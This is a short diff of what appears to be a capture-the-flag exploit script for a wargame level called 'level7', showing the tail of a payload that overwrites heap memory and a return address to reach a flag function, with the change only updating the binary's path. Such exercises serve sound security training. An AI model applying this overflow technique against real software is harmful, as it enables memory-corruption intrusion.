@@ -34,4 +34,4 @@ MAIN_RET_REPLACEMENT="$(hex_little_endian "${M_ADDRESS}")"
 
 # Calling 'n' gives the flag
 PAYLOAD="${BUFFER_FILLER}${MALLOC_HEADER_FILLER}${ARG2N_FILLER}${ARG2STR_REPLACEMENT}"
-env -i ./level7 "${PAYLOAD}" "${MAIN_RET_REPLACEMENT}"
+env -i /home/user/level7/level7 "${PAYLOAD}" "${MAIN_RET_REPLACEMENT}"
